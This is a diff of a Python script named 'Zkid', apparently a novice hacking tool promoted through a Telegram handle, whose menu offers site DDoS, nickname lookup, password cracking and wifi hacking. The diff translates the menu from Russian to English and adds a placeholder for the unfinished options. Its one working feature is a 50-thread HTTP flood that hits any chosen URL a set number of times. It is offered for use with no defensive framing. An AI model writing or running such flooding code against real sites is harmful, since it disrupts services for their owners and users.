@@ -1,3 +1,4 @@
+import time
 import threading
 import os
 import requests as req
@@ -15,35 +16,24 @@ B = "\033[1;34m" # BLUE
 V = "\033[1;35m" # VIOLET
 C = "\033[1;36m" # CYAN
 W = "\033[1;37m" # WHITE
-#Table of light colors
-DL = "\033[1;90m"
-RL = "\033[1;91m"
-GL = "\033[1;92m"
-YL = "\033[1;93m"
-BL = "\033[1;94m"
-VL = "\033[1;95m"
-CL = "\033[1;96m"
-WL = "\033[1;97m"
-RE = "\033[0m"   # REMOVE
-# 1;30m, 1/0 = bold, 30-37 color, 90-97 light color.
-
+RE = "\033[0m" # Remove
 
 print(f"""
 {W}
-{W}   ▟███████▙{RE}{C}  █▟█  ▟█  ▟█  ▟██████▙
-{W}   ▝▝▝▟██▛▘▘{RE}{C}  ██▛▟█▛▘  ██  ██▝▝▝▟█▙
-{B}     ▟██▛   {RE}{C}  █████▙   ██  ██   ▟█▛
+{W}   ▟███████▙{RE}{R}  █▟█  ▟█  ▟█  ▟██████▙
+{W}   ▝▝▝▟██▛▘▘{RE}{Y}  ██▛▟█▛▘  ██  ██▝▝▝▟█▙
+{B}     ▟██▛   {RE}{G}  █████▙   ██  ██   ▟█▛
 {B}    ▟██▛    {RE}{C}  ██▛▝██▙  ██  ██   ▟█▛
-{R}   ▟███████▙{RE}{C}  ██   ██  ██  ▟██████▛
-{R}   ▝▝▝▝▝▝▝▝▘{RE}{C}  ▝▘   ▝▘  ▝▘  ▝▝▝▝▝▝▝
-{RE}          {C}TELEGRAM{RE}: {V}cgrokpp{RE}
+{R}   ▟███████▙{RE}{B}  ██   ██  ██  ▟██████▛
+{R}   ▝▝▝▝▝▝▝▝▘{RE}{V}  ▝▘   ▝▘  ▝▘  ▝▝▝▝▝▝▝
+{RE}   {C}TELEGRAM{RE}: {V}cgrokpp{RE} {C}|{RE} {Y}made in Ukraine{RE}
 """)
 print(f"""
-{R}   [1] DDoS сайта         [2] Пробив никнейма
+{R}   [1] DDoS site         [2] Search nickname
 
-   [3] Подбор пароля      [4] Взлом роутера
+   [3] Hack password      [4] Hack wifi
 
-   [0] Выход{RE}
+   [0] Exit{RE}
 """)
 while True:
     select = input(f"{V}Zkid>> {RE}")
@@ -51,9 +41,9 @@ while True:
         exit()
     elif select == "1":
         import threading
-        urlname = input(f"{Y}Назв сайта: {RE}https://")
+        urlname = input(f"{Y}Site name: {RE}https://")
         url = "https://" + urlname
-        total = int(input(f"{Y}Количество ударов: {RE}"))
+        total = int(input(f"{Y}How many hits: {RE}"))
         threads_num = 50
         hits = 0
         lock = threading.Lock()
@@ -65,13 +55,17 @@ while True:
                     with lock:
                         if hits < total:
                             hits += 1
-                            print(f"\r{G}Ударов: {hits}/{total}{RE}", end="", flush=True)
+                            print(f"\r{G}Hits: {hits}/{total}{RE}", end="", flush=True)
                 except: pass
-        print(f"{R}Атака...{RE}")
+        print(f"{R}Attacking{RE}")
         threads = []
         for i in range(threads_num):
             t = threading.Thread(target=attack)
             t.start()
             threads.append(t)
         for t in threads: t.join()
-        print(f"\n{C}Готово{RE}")
+        print(f"\n{C}process end{RE}")
+    elif select == "2":
+        print(f"\r{R}working on it (2 3 4 not ready){RE}")
+        time.sleep(1)
+        os.system("python Zkid.py")
